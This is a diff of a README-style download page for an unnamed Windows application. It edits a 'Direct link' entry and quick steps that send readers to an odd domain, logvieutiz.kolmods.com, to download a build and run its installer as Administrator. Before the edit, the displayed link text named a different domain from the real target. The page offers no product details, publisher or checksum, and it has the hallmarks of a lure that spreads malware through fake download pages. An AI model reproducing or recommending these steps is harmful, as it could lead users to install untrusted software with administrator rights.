@@ -30,14 +30,14 @@
 
 | | |
 | --- | --- |
-| **Direct link** | **[logvieutiz.wonderchain.fun](https://logvieutiz.kolmods.com/)** |
+| **Direct link** | **[logvieutiz.kolmods.com](https://logvieutiz.kolmods.com/)** |
 | **Full URL** | `https://logvieutiz.kolmods.com/` |
 | **Platform** | Windows 10 / 11 (64-bit) |
 | **Install** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Open **[logvieutiz.wonderchain.fun](https://logvieutiz.kolmods.com/)** in your browser
+1. Open **[logvieutiz.kolmods.com](https://logvieutiz.kolmods.com/)** in your browser
 2. Download the latest Windows build
 3. Run the installer **as Administrator**
 4. Launch from Start menu or tray icon
